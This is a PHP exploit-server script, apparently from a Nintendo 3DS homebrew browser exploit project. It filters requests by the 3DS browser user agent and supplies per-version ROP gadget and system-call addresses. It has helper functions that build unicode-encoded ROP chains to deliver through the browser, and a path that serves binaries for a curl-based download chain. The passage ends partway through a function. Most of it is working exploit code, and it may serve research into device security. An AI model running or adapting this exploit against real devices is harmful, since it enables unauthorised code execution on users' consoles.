<?php

$getbinselect = -1;//Check the getbin param, for when handling a request from the curl httpdownload ROP below. This is done before the user-agent checks since the UA isn't set when downloading with the below curl ROP.
$getbinparam =  "";
if(isset($_REQUEST['getbin']))$getbinparam = $_REQUEST['getbin'];

browserhaxcfg_parsebinparam();

if($getbinselect==3)
{
	$path = browserhaxcfg_getbinpath_val3();

	$con = file_get_contents($path);
	if($con===FALSE)
	{
		echo "Failed to open binary on the server.";
	}
	else
	{
		echo $con;
	}

	return;
}

$ua = $_SERVER['HTTP_USER_AGENT'];
if(!strstr($ua, "Mozilla/5.0 (Nintendo 3DS; U; ; ") && !strstr($ua, "Mozilla/5.0 (New Nintendo 3DS"))
{
	header("Location: /");
	//echo "This only supports the Nintendo (New3DS)3DS main web-browser.\n";
	writeNormalLog("RESULT: 200 INVALID USER-AGENT, REDIRECTING");
	return;
}

$browserver = -1;

//old3ds: browserver titlever sysver
if(strstr($ua, "1.7412"))//1.7412 v6/2.0.0-2
{
	$browserver = 0;
} else if(strstr($ua, "1.7455"))//1.7455 v1024/2.1.0-4
{
	$browserver = 1;
} else if(strstr($ua, "1.7498"))//1.7498 v2050/4.0.0-7
{
	$browserver = 2;
} else if(strstr($ua, "1.7552"))//1.7552 v3075/5.0.0-11 / v3088/7.0.0-13 (v3088 main ncch is the same as v3075, only the manual CFA was updated)
{
	$browserver = 3;
} else if(strstr($ua, "1.7567"))//1.7567 v4096/7.1.0-16
{
	$browserver = 4;
}

//new3ds: Mobile-NintendoBrowser-version titlever sysver
if(strstr($ua, "1.0.9934"))//1.0.9934 v10 9.0.0-20
{
	$browserver = 0x80;
}

if($browserver == -1)
{
	echo "This browser version is not recognized.\n";
	writeNormalLog("RESULT: 200 BROWSERVER NOT RECOGNIZED");
	return;
}

if($browserver != 1 && $browserver != 2 && $browserver != 3 && $browserver != 4 && $browserver != 0x80)
{
	echo "This browser version is not supported.\n";
	writeNormalLog("RESULT: 200 BROWSERVER NOT SUPPORTED");
	return;
}

$DEVUNIT = 0;
$ropchainselect = -1;
$ropchainparam =  "";
if(isset($_REQUEST['rop']))$ropchainparam = $_REQUEST['rop'];
if(isset($_REQUEST['dev']))
{
	$devparam = $_REQUEST['dev'];
	if($devparam=="0")$DEVUNIT = 0;
	if($devparam=="1")$DEVUNIT = 1;
}

browserhaxcfg_handle_urlparams();

if($ropchainselect == -1)
{
	$ropchainselect = 0;
	$arm11code_loadfromsd = 2;
	if($browserver < 3)$ropchainselect = 1;

	browserhaxcfg_handledefault();
}

if($browserver == 1)
{
	$CODEBLK_ENDADR = 0x00405000;
	$OSSCRO_HEAPADR = 0x08385000;
	$WEBKITCRO_HEAPADR = 0x08559000;
	$APPHEAP_PHYSADDR = 0x24cff000;//physical address where the 0x08000000 heap is mapped.
	init_mapaddrs_cro();

	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2dec8;

	$STACKPIVOT_ADR = 0x002d5684;
	$THROW_FATALERR = 0x0025f214;
	$COND_THROWFATALERR = 0x0013ba4c;//executes this when r0 bit31 is set: "blne throw_fatalerr". then: "pop {r3, pc}"

	//$ROP_POP_R0R3PC = 0x002f7c34;//"pop {r0, r1, r2, r3, pc}"
	$ROP_POP_R0R6PC = 0x0020f04c;//"pop {r0, r1, r2, r3, r4, r5, r6, pc}"
	$ROP_POP_R0R8PC = 0x002218d0;//"pop {r0, r1, r2, r3, r4, r5, r6, r7, r8, pc}"
	$ROP_POP_R0IPPC = 0x0022d984;//"pop {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}"
	$ROP_POP_R0PC = 0x002ac330;//"pop {r0, pc}"
	$ROP_POP_R1R5PC = 0x001024c8;//"pop {r1, r2, r3, r4, r5, pc}"

	$ROP_STR_R1TOR0 = 0x00140acc;//"str r1, [r0]" "bx lr"
	$ROP_LDR_R0FROMR0 = 0x00179d54;//"ldr r0, [r0]" "bx lr"
	$ROP_STR_R1_TOR0_SHIFTR2 = 0x001e96b4;//"str r1, [r0, r2, lsl #2]" "bx lr"
	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x001649e8;//"ldr r0, [r0, r1, lsl #2]" "bx lr"
	$ROP_ADDR0_TO_R1 = 0x0012d258;//"add r0, r0, r1" "bx lr"

	$ROP_LDMSTM_R5R4_R0R3 = 0x00222830;//"cmp r0, #0" "ldmne r5, {r0, r1, r2, r3}" "stmne r4, {r0, r1, r2, r3}" "popne {r4, r5, r6, pc}"

	//$ROP_WRITEU32_TOTHREADSTORAGE = 0x00140a80;//"mrc 15, 0, r2, cr13, cr0, {3}" "ldr r0, [r0]" "str r1, [r2, r0, lsl #2]" "bx lr"
	//$ROP_READU32_FROMTHREADSTORAGE = 0x001c6d24;//"mrc 15, 0, r1, cr13, cr0, {3}" "ldr r0, [r0]" "ldr r0, [r1, r0, lsl #2]" "bx lr"

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x0025ee6c;//if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> branch to: "pop {r4, r5, r6, r7, r8, pc}"}

	$ROP_STMR0_R0PC = 0x0010012c;//"stm r0, {r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, sl, fp, ip, sp, lr, pc}" "bx lr"

	//$ROP_MEMCPY = 0x002856ac;
	//$ROP_MEMSETOTHER = 0x0027b2f0;//r0=addr, r1=size, r2=value

	$ROP_INFINITELP = 0x0024847d;//thumb "b ."

	//$ROP_CLOSEHANDLE = genu32_unicode(0x001569d0);//"ldr r0, [r5]", if(r0!=0){bl svcCloseHandle; str r4, [r5]} "mov r0, r4" "pop {r4, r5, r6, r7, r8, pc}"

	$SRVPORT_HANDLEADR = 0x003b9448;
	$SRV_REFCNT = 0x003b88fc;
	//$ROP_SRVINIT = genu32_unicode(0x0025f170);
	$srvpm_initialize = 0x00147864;
	$srv_shutdown = 0x0014765c;
	$srv_GetServiceHandle = 0x25f088;

	$svcGetProcessId = 0x002a0a30;
	$svcSendSyncRequest = 0x0025f080;//"svc 0x00000032" "bx lr"
	$svcControlMemory = 0x002d5700;
	$svcSleepThread = 0x002a3e84;

	$GXLOW_CMD4 = 0x002c565c;
	$GSP_FLUSHDCACHE = 0x00345ec8;
	$GSP_WRITEHWREGS = 0x002b6c44;
	$GSPGPU_SERVHANDLEADR = 0x003b9438;

	$IFile_Open = 0x0025bc00;
	$IFile_Close = 0x0025bd20;
	$IFile_GetSize = 0x00301cd4;
	$IFile_Read = 0x002fa864;
	$IFile_Write = 0x00310190;

	$FS_DELETEFILE = 0x00322e94;

	$FSFILEIPC_CLOSE = 0x0013fc5c;
	$FSFILEIPC_READ = 0x0013fc00;
	$FSFILEIPC_GETSIZE = 0x0013fd04;

	$OPENFILEDIRECTLY_WRAP = 0x0013ce28;

	$APT_PrepareToDoApplicationJump = 0x00155224;
	$APT_DoApplicationJump = 0x001542d4;
}
else if($browserver == 2)
{
	$CODEBLK_ENDADR = 0x00401000;
	$OSSCRO_HEAPADR = 0x08385000;
	$WEBKITCRO_HEAPADR = 0x08558000;
	$APPHEAP_PHYSADDR = 0x24d02000;
	init_mapaddrs_cro();

	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2dd58;

	$STACKPIVOT_ADR = 0x002d6a60;
	$THROW_FATALERR = 0x0025e34c;
	$COND_THROWFATALERR = 0x0013b284;

	//$ROP_POP_R0R3PC = 0x002f9854;
	$ROP_POP_R0R6PC = 0x00210b18;
	$ROP_POP_R0R8PC = 0x00238674;
	$ROP_POP_R0IPPC = 0x0022ce08;
	$ROP_POP_R0PC = 0x002ad574;
	$ROP_POP_R1R5PC = 0x001024f0;

	$ROP_STR_R1TOR0 = 0x00141224;
	$ROP_LDR_R0FROMR0 = 0x00179100;
	$ROP_STR_R1_TOR0_SHIFTR2 = 0x001ebad4;
	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00167730;
	$ROP_ADDR0_TO_R1 = 0x0012d588;

	$ROP_LDMSTM_R5R4_R0R3 = 0x00221d40;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x003549ec;//if(ip!=0){r0 = <threadlocalstorageptr>; <write r0 to r5+4> branch over a function-call} <func-call that can be skipped> *(((u32*)r5+8)++; r0=r4; "pop {r4, r5, r6, pc}"

	$ROP_STMR0_R0PC = 0x0010012c;

	//$ROP_MEMCPY = 0x002848dc;
	//$ROP_MEMSETOTHER = 0x00269768;

	//$ROP_CLOSEHANDLE = genu32_unicode(0x001569dc);

	$SRVPORT_HANDLEADR = 0x003b644c;
	$SRV_REFCNT = 0x003b5900;
	$srvpm_initialize = 0x00147cd0;
	$srv_shutdown = 0x00147b2c;
	$srv_GetServiceHandle = 0x0025e384;

	$svcGetProcessId = 0x002a1d00;
	$svcSendSyncRequest = 0x0025e37c;
	$svcControlMemory = 0x002d6adc;
	$svcSleepThread = 0x002a513c;

	$GXLOW_CMD4 = 0x002c62e4;
	$GSP_FLUSHDCACHE = 0x00344b80;
	$GSP_WRITEHWREGS = 0x002b8008;
	$GSPGPU_SERVHANDLEADR = 0x003b643c;

	$IFile_Open = 0x0025b0a4;
	$IFile_Close = 0x0025b1c4;
	$IFile_GetSize = 0x00303f44;
	$IFile_Read = 0x002fc8e4;
	$IFile_Write = 0x00311d90;

	$FS_DELETEFILE = 0x00311ae8;

	$FSFILEIPC_CLOSE = 0x001400e4;
	$FSFILEIPC_READ = 0x00140088;
	$FSFILEIPC_GETSIZE = 0x0014018c;

	$OPENFILEDIRECTLY_WRAP = 0x0013d0e0;

	$APT_PrepareToDoApplicationJump = 0x001552b8;
	$APT_DoApplicationJump = 0x0015454c;
}
else if($browserver == 3)
{
	$CODEBLK_ENDADR = 0x00440000;
	$OSSCRO_HEAPADR = 0x083a5000;
	$WEBKITCRO_HEAPADR = 0x08582000;
	$APPHEAP_PHYSADDR = 0x25000000;
	init_mapaddrs_cro();

	if($DEVUNIT==0)
	{
		$STACKPIVOT_ADR = 0x001303d0;
		$THROW_FATALERR = 0x00151b08;
		$COND_THROWFATALERR = 0x00282488;

		$ROP_POP_R0R6PC = 0x00105144;
		$ROP_POP_R0R8PC = 0x00130ff8;
		$ROP_POP_R0IPPC = 0x0018c9a4;
		$ROP_POP_R0PC = 0x0010c320;
		$ROP_POP_R1R5PC = 0x00101e98;

		$ROP_STR_R1TOR0 = 0x001040d4;
		$ROP_LDR_R0FROMR0 = 0x0011168c;
		$ROP_STR_R1_TOR0_SHIFTR2 = 0x003329f4;
		$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101218;
		$ROP_ADDR0_TO_R1 = 0x0012bb98;

		$ROP_LDMSTM_R5R4_R0R3 = 0x001d3ef0;

		$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x0016882c;//if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> *(((u32*)r4+8)++; r0=1} "pop {r4, pc}"

		$ROP_STMR0_R0PC = 0x001bb4c4;

		//$ROP_MEMCPY = 0x0023ff64;
		//$ROP_MEMSETOTHER = 0x0023c568;

		$SRVPORT_HANDLEADR = 0x003d968c;
		$SRV_REFCNT = 0x003d8f64;
		$srvpm_initialize = 0x0028c0f4;
		$srv_shutdown = 0x0028c9c4;
		$srv_GetServiceHandle = 0x0023c454;

		$svcGetProcessId = 0x00100ca4;
		$svcSendSyncRequest = 0x002443ec;
		$svcControlMemory = 0x001431c0;
		$svcSleepThread = 0x0010420c;

		$GXLOW_CMD4 = 0x0011dd80;
		$GSP_FLUSHDCACHE = 0x001914f8;
		$GSP_WRITEHWREGS = 0x0011e188;//inr0=regadr inr1=bufptr inr2=bufsz
		$GSPGPU_SERVHANDLEADR = 0x003da72c;

		$IFile_Open = 0x0022fe44;
		$IFile_Close = 0x001fdbc0;
		$IFile_GetSize = 0x002074fc;
		$IFile_Seek = 0x00151658;
		$IFile_Read = 0x001686c0;
		$IFile_Write = 0x00168748;

		$FS_DELETEFILE = 0x001683a4;//r0=utf16* filepath

		$FSFILEIPC_CLOSE = 0x0027ec40;
		$FSFILEIPC_READ = 0x0027ebe8;//inr0=handle* inr1=transfercount* inr2/inr3=u64 offset insp0=databuf insp4=size
		$FSFILEIPC_GETSIZE = 0x0027eccc;//inr0=handle* inr1=u64 out*

		//$READ_EXEFSFILE = 0x0027b378;//"inr0=outbuf inr1=readsize inr2=archive lowpathtype inr3=archive lowpath data* insp0=archive lowpath datasize insp4=ptr to 8-byte exefs filename"
		$OPENFILEDIRECTLY_WRAP = 0x0027b5e0;//inr0=fileouthandle* inr1=archiveid inr2=archive lowpath* inr3=file lowpath* (lowpath struct ptr: +0 = type, +4 = dataptr*, +8 = size)

		$APT_PrepareToDoApplicationJump = 0x00299f98;
		$APT_DoApplicationJump = 0x0029951c;
	}
	else
	{
		$STACKPIVOT_ADR = 0x00190060;
		$THROW_FATALERR = 0x0017a2a8;
		$COND_THROWFATALERR = 0x002822a0;

		$ROP_POP_R0R6PC = 0x00103d3c;
		$ROP_POP_R0R8PC = 0x00117778;
		$ROP_POP_R0IPPC = 0x0015864c;
		$ROP_POP_R0PC = 0x00139250;
		$ROP_POP_R1R5PC = 0x00101e78;

		$ROP_STR_R1TOR0 = 0x00103ba4;
		$ROP_LDR_R0FROMR0 = 0x0010e98c;
		$ROP_STR_R1_TOR0_SHIFTR2 = 0x003327fc;
		$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101208;
		$ROP_ADDR0_TO_R1 = 0x001a3bfc;

		$ROP_LDMSTM_R5R4_R0R3 = 0x001d1e2c;

		$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x001251f4;

		$ROP_STMR0_R0PC = 0x001bb3e8;

		$SRVPORT_HANDLEADR = 0x003d968c;
		$SRV_REFCNT = 0x003d8f74;
		$srvpm_initialize = 0x0028bf0c;
		$srv_shutdown = 0x0028c7dc;
		$srv_GetServiceHandle = 0x0023be80;

		$svcGetProcessId = 0x00100c9c;
		$svcSendSyncRequest = 0x002441c0;
		$svcControlMemory = 0x00146508;
		$svcSleepThread = 0x0010e9b8;

		$GXLOW_CMD4 = 0x00195b38;
		$GSP_FLUSHDCACHE = 0x00195a34;
		$GSP_WRITEHWREGS = 0x001b2c9c;

		$IFile_Open = 0x002159e8;
		$IFile_Close = 0x0020a9b0;
		$IFile_GetSize = 0x001edcb8;
		$IFile_Seek = 0x0014f8a8;
		$IFile_Read = 0x0014f820;
		$IFile_Write = 0x00179cfc;

		$FS_DELETEFILE = 0x00179b18;

		$FSFILEIPC_CLOSE = 0x0027ea58;
		$FSFILEIPC_READ = 0x0027ea00;
		$FSFILEIPC_GETSIZE = 0x0027eae4;

		$OPENFILEDIRECTLY_WRAP = 0x0027b3f8;
	}
}
else if($browserver == 4)
{
	$CODEBLK_ENDADR = 0x00440000;
	$OSSCRO_HEAPADR = 0x083a5000;
	$WEBKITCRO_HEAPADR = 0x08582000;
	$APPHEAP_PHYSADDR = 0x25000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x00130388;
	$THROW_FATALERR = 0x00151b44;
	$COND_THROWFATALERR = 0x002824a8;

	$ROP_POP_R0R6PC = 0x0010512c;
	$ROP_POP_R0R8PC = 0x00130fb0;
	$ROP_POP_R0IPPC = 0x0018c9b0;
	$ROP_POP_R0PC = 0x0010c2fc;
	$ROP_POP_R1R5PC = 0x00101e8c;

	$ROP_STR_R1TOR0 = 0x001040c0;
	$ROP_LDR_R0FROMR0 = 0x00111668;
	$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;
	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;
	$ROP_ADDR0_TO_R1 = 0x0012bb50;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001d3f04;

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00168848;//Same code as browserver val3.

	$ROP_STMR0_R0PC = 0x001bb4cc;

	//$ROP_MEMCPY = 0x0023ff60;
	//$ROP_MEMSETOTHER = 0x0023c570;

	$SRVPORT_HANDLEADR = 0x003d968c;
	$SRV_REFCNT = 0x003d8f64;
	$srvpm_initialize = 0x0028c114;
	$srv_shutdown = 0x0028c9e4;
	$srv_GetServiceHandle = 0x0023c45c;

	$svcGetProcessId = 0x00100ca4;
	$svcSendSyncRequest = 0x002443e4;
	$svcControlMemory = 0x001431a0;
	$svcSleepThread = 0x001041f8;

	$GXLOW_CMD4 = 0x0011dd48;
	$GSP_FLUSHDCACHE = 0x00191500;
	$GSP_WRITEHWREGS = 0x0011e150;
	$GSPGPU_SERVHANDLEADR = 0x003da72c;

	$IFile_Open = 0x0022fe08;
	$IFile_Close = 0x001fdba4;
	$IFile_GetSize = 0x00207514;
	$IFile_Seek = 0x00151694;
	$IFile_Read = 0x001686dc;
	$IFile_Write = 0x00168764;

	$FS_DELETEFILE = 0x001683c0;

	$FSFILEIPC_CLOSE = 0x0027ec60;
	$FSFILEIPC_READ = 0x0027ec08;
	$FSFILEIPC_GETSIZE = 0x0027ecec;

	//$READ_EXEFSFILE = 0x0027b398;
	$OPENFILEDIRECTLY_WRAP = 0x0027b600;

	$APT_PrepareToDoApplicationJump = 0x00299fb8;
	$APT_DoApplicationJump = 0x0029953c;
}
else if($browserver == 0x80)//new3ds
{
	$CODEBLK_ENDADR = 0x00422000;
	$OSSCRO_HEAPADR = 0x0810e000;
	$WEBKITCRO_HEAPADR = 0x083cc000;
	$APPHEAP_PHYSADDR = 0x2b000000;
	init_mapaddrs_cro();

	$STACKPIVOT_ADR = 0x00279a10;
	$THROW_FATALERR = 0x001f10fc;
	$COND_THROWFATALERR = 0x00261148;

	$ROP_POP_R0R6PC = 0x001de9f0;
	$ROP_POP_R0R8PC = 0x00309fdc;
	$ROP_POP_R0IPPC = $WEBKITCRO_MAPADR+0x001b2d04;
	$ROP_POP_R0PC = 0x002954e8;
	$ROP_POP_R1R5PC = 0x001dbfd0;

	$ROP_STR_R1TOR0 = 0x002258a4;
	$ROP_LDR_R0FROMR0 = 0x001f6a60;
	$ROP_STR_R1_TOR0_SHIFTR2 = 0x00332a14;//needs updated
	$ROP_LDR_R0_FROMR0_SHIFTR1 = 0x00101214;//needs updated
	$ROP_ADDR0_TO_R1 = 0x0027a2c0;

	$ROP_LDMSTM_R5R4_R0R3 = 0x001d3f04;//needs updated

	$ROP_WRITETHREADSTORAGEPTR_TOR4R5 = 0x00295b8c;//Same code as browserver val3.

	$ROP_STMR0_R0PC = 0x001bb4cc;//needs updated

	$SRVPORT_HANDLEADR = 0x003d9f80;
	$SRV_REFCNT = 0x003d9da8;
	$srvpm_initialize = 0x001ea3cc;
	$srv_shutdown = 0x0028c9e4;//needs updated
	$srv_GetServiceHandle = 0x001e9ce4;

	$svcGetProcessId = 0x0026a608;
	$svcSendSyncRequest = 0x001ea320;
	$svcControlMemory = 0x00261eb8;
	$svcSleepThread = 0x002d6a5c;

	$GXLOW_CMD4 = 0x002a08d0;
	$GSP_FLUSHDCACHE = 0x0029c02c;
	$GSP_WRITEHWREGS = 0x002968bc;
	$GSPGPU_SERVHANDLEADR = 0x003da3d0;

	$IFile_Open = 0x0022fe08;//needs updated
	$IFile_Close = 0x001fdba4;//needs updated
	$IFile_GetSize = 0x00207514;//needs updated
	$IFile_Seek = 0x00151694;//needs updated
	$IFile_Read = 0x001686dc;//needs updated
	$IFile_Write = 0x00168764;//needs updated

	$FS_DELETEFILE = 0x001683c0;//needs updated

	$FSFILEIPC_CLOSE = 0x0027ec60;//needs updated
	$FSFILEIPC_READ = 0x0027ec08;//needs updated
	$FSFILEIPC_GETSIZE = 0x0027ecec;//needs updated

	$OPENFILEDIRECTLY_WRAP = 0x0027b600;//needs updated

	//$APT_PrepareToDoApplicationJump = 0x00299fb8;//needs updated
	//$APT_DoApplicationJump = 0x0029953c;//needs updated
}

if($browserver < 3)
{
	$WKC_FOPEN = $OSSCRO_MAPADR+0x680;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0x678;
	$WKC_FREAD = $OSSCRO_MAPADR+0x688;
	$WKC_FWRITE = $OSSCRO_MAPADR+0x690;
	$WKC_FSEEK = $OSSCRO_MAPADR+0x6a0;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0xea0;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0xea8;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xed0;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa28;
}
else if($browserver == 4)
{
	$ROP_STR_R0TOR1 = $WEBKITCRO_MAPADR+0x2f9f0;

	$WKC_FOPEN = $OSSCRO_MAPADR+0x5cc;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0x5c4;
	$WKC_FREAD = $OSSCRO_MAPADR+0x5d4;
	$WKC_FWRITE = $OSSCRO_MAPADR+0x5dc;
	$WKC_FSEEK = $OSSCRO_MAPADR+0x5ec;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0xe98;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0xea0;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0xec8;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0xa28;
}
else if($browserver == 0x80)//new3ds
{
	$WKC_FOPEN = $OSSCRO_MAPADR+0x18ae48;
	$WKC_FCLOSE = $OSSCRO_MAPADR+0xd492c;
	$WKC_FREAD = $OSSCRO_MAPADR+0xd4934;
	$WKC_FWRITE = $OSSCRO_MAPADR+0xd4944;
	$WKC_FSEEK = $OSSCRO_MAPADR+0xd475c;

	$ROP_curl_easy_cleanup = $WEBKITCRO_MAPADR+0x4db5bc;
	$ROP_curl_easy_init = $WEBKITCRO_MAPADR+0x4db124;
	$ROP_curl_easy_perform = $WEBKITCRO_MAPADR+0x4db684;
	$ROP_curl_easy_setopt = $WEBKITCRO_MAPADR+0x4db12c;
}

if($browserver < 0x80)
{
	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x190;
	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x308;
}
else if($browserver >= 0x80)
{
	$ROP_MEMCPY = $WEBKITCRO_MAPADR+0x4da9cc;
	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4da9ac;
}

$STACKPIVOT = genu32_unicode_jswrap($STACKPIVOT_ADR);
$POPLRPC = $STACKPIVOT_ADR + 0x18;//"pop {lr}" "pop {pc}"

if($browserver < 0x80)
{
	$POPPC = $STACKPIVOT_ADR + 0x1c;
}
else
{
	$POPPC = 0x001de80c;
}

$NOPSLEDROP = genu32_unicode_jswrap($POPPC);//"pop {pc}"

$DIFF_FILEREAD_FUNCPTR = 0x080952c0+8;
$ARM9_HEAPHAXBUF = 0x80a2e80 - 0x2800;

function genu32_unicode($value)
{
	$hexstr = sprintf("%08x", $value);

	$outstr = "\u" . substr($hexstr, 4, 4) . "\u" . substr($hexstr, 0, 4);

	return $outstr;
}

function genu32_unicode_jswrap($value)
{
	$str = "\"" . genu32_unicode($value) . "\"";
	return $str;
}

function init_mapaddrs_cro()
{
	global $OSSCRO_MAPADR, $WEBKITCRO_MAPADR, $OSSCRO_HEAPADR, $WEBKITCRO_HEAPADR, $CODEBLK_ENDADR;
	$OSSCRO_MAPADR = ($OSSCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
	$WEBKITCRO_MAPADR = ($WEBKITCRO_HEAPADR - 0x08000000) + $CODEBLK_ENDADR;
}

function generate_ropchain()
{
	global $ROPCHAIN, $THROW_FATALERR, $ropchainselect;

	$ROPCHAIN = "\"";

	if($ropchainselect==0)
	{
		$ROPCHAIN.= genu32_unicode($THROW_FATALERR);
	}
	else if($ropchainselect==1)
	{
		generateropchain_type1();
	}
	else if($ropchainselect==2)
	{
		generateropchain_type2();
	}
	else if($ropchainselect==3)
	{
		generateropchain_type3();
	}
	else if($ropchainselect==4)
	{
		generateropchain_type4();
	}

	$ROPCHAIN.= "\"";
}

function ropgen_condfatalerr()
{
	global $ROPCHAIN, $COND_THROWFATALERR;

	$ROPCHAIN.= genu32_unicode($COND_THROWFATALERR);
	$ROPCHAIN.= genu32_unicode(0x0);//r3
}

function ropgen_callfunc($r0, $r1, $r2, $r3, $lr, $pc)
{
	global $ROPCHAIN, $POPLRPC, $ROP_POP_R0R6PC;//$ROP_POP_R0R3PC;

	$ROPCHAIN.= genu32_unicode($POPLRPC);
	$ROPCHAIN.= genu32_unicode($lr);

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC/*$ROP_POP_R0R3PC*/);
	$ROPCHAIN.= genu32_unicode($r0);
	$ROPCHAIN.= genu32_unicode($r1);
	$ROPCHAIN.= genu32_unicode($r2);
	$ROPCHAIN.= genu32_unicode($r3);
	$ROPCHAIN.= genu32_unicode(0x0);//r4
	$ROPCHAIN.= genu32_unicode(0x0);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6

	$ROPCHAIN.= genu32_unicode($pc);
}

function ropgen_writeu32($addr, $value, $shiftval, $setr0)
{
	global $ROPCHAIN, $POPPC, $ROP_STR_R1TOR0, $ROP_STR_R1_TOR0_SHIFTR2, $POPLRPC, $ROP_POP_R1R5PC;

	if($shiftval==0)
	{
		if($setr0!=0)
		{
			ropgen_callfunc($addr, $value, 0x0, 0x0, $POPPC, $ROP_STR_R1TOR0);
		}
		else
		{
			$ROPCHAIN.= genu32_unicode($POPLRPC);
			$ROPCHAIN.= genu32_unicode($POPPC);

			$ROPCHAIN.= genu32_unicode($ROP_STR_R1TOR0);
		}
	}
	else
	{
		if($setr0!=0)
		{
			ropgen_callfunc($addr, $value, $shiftval, 0x0, $POPPC, $ROP_STR_R1_TOR0_SHIFTR2);
		}
		else
		{
			$ROPCHAIN.= genu32_unicode($POPLRPC);
			$ROPCHAIN.= genu32_unicode($POPPC);

			$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
			$ROPCHAIN.= genu32_unicode($value);//r1
			$ROPCHAIN.= genu32_unicode($shiftval);//r2
			$ROPCHAIN.= genu32_unicode(0x0);//r3
			$ROPCHAIN.= genu32_unicode(0x0);//r4
			$ROPCHAIN.= genu32_unicode(0x0);//r5

			$ROPCHAIN.= genu32_unicode($ROP_STR_R1_TOR0_SHIFTR2);
		}
	}
}

function ropgen_readu32($addr, $shiftval, $setr0)//r0 = u32 loaded from addr
{
	global $ROPCHAIN, $ROP_POP_R0PC, $POPPC, $POPLRPC, $ROP_LDR_R0FROMR0, $ROP_LDR_R0_FROMR0_SHIFTR1, $ROP_POP_R1R5PC;

	if($shiftval==0)
	{
		$ROPCHAIN.= genu32_unicode($ROP_POP_R0PC);
		$ROPCHAIN.= genu32_unicode($addr);//r0
		$ROPCHAIN.= genu32_unicode($POPLRPC);

		$ROPCHAIN.= genu32_unicode($POPPC);//lr
		$ROPCHAIN.= genu32_unicode($ROP_LDR_R0FROMR0);
	}
	else
	{
		if($setr0!=0)
		{
			ropgen_callfunc($addr, $shiftval, 0x0, 0x0, $POPPC, $ROP_LDR_R0_FROMR0_SHIFTR1);
		}
		else
		{
			$ROPCHAIN.= genu32_unicode($POPLRPC);
			$ROPCHAIN.= genu32_unicode($POPPC);

			$ROPCHAIN.= genu32_unicode($ROP_POP_R1R5PC);
			$ROPCHAIN.= genu32_unicode($shiftval);//r1
			$ROPCHAIN.= genu32_unicode(0x0);//r2
			$ROPCHAIN.= genu32_unicode(0x0);//r3
			$ROPCHAIN.= genu32_unicode(0x0);//r4
			$ROPCHAIN.= genu32_unicode(0x0);//r5

			$ROPCHAIN.= genu32_unicode($ROP_LDR_R0_FROMR0_SHIFTR1);
		}
	}
}

function ropgen_getptr_threadlocalstorage()//r0 = threadlocalstorage-ptr
{
	global $ROPCHAIN, $ROPHEAP, $browserver, $ROP_WRITETHREADSTORAGEPTR_TOR4R5, $ROP_POP_R0IPPC;

	//$browserver==1 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> branch to: "pop {r4, r5, r6, r7, r8, pc}"}
	//$browserver==2 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(ip!=0){r0 = <threadlocalstorageptr>; <write r0 to r5+4> branch over a function-call} <func-call that can be skipped> *(((u32*)r5+8)++; r0=r4; "pop {r4, r5, r6, pc}"
	//$browserver==3 $ROP_WRITETHREADSTORAGEPTR_TOR4R5: if(r0!=0){r0 = <threadlocalstorageptr>; <write r0 to r4+4> *(((u32*)r4+8)++; r0=1} "pop {r4, pc}"

	$ROPCHAIN.= genu32_unicode($ROP_POP_R0IPPC);

	$ROPCHAIN.= genu32_unicode(0x1);//r0
	$ROPCHAIN.= genu32_unicode(0x0);//r1
	$ROPCHAIN.= genu32_unicode(0x0);//r2
	$ROPCHAIN.= genu32_unicode(0x0);//r3
	$ROPCHAIN.= genu32_unicode($ROPHEAP);//r4
	$ROPCHAIN.= genu32_unicode($ROPHEAP);//r5
	$ROPCHAIN.= genu32_unicode(0x0);//r6
	$ROPCHAIN.= genu32_unicode(0x0);//r7
	$ROPCHAIN.= genu32_unicode(0x0);//r8
	$ROPCHAIN.= genu32_unicode(0x0);//r9
	$ROPCHAIN.= genu32_unicode(0x0);//sl
	$ROPCHAIN.= genu32_unicode(0x0);//fp
	$ROPCHAIN.= genu32_unicode(0x1);//ip
	$ROPCHAIN.= genu32_unicode($ROP_WRITETHREADSTORAGEPTR_TOR4R5);

	if($browserver==1)
	{
		$ROPCHAIN.= genu32_unicode(0x0);//r4
		$ROPCHAIN.= genu32_unicode(0x0);//r5
		$ROPCHAIN.= genu32_unicode(0x0);//r6
		$ROPCHAIN.= genu32_unicode(0x0);//r7
		$ROPCHAIN.= genu32_unicode(0x0);//r8
	}
	else if($browserver==2)
	{
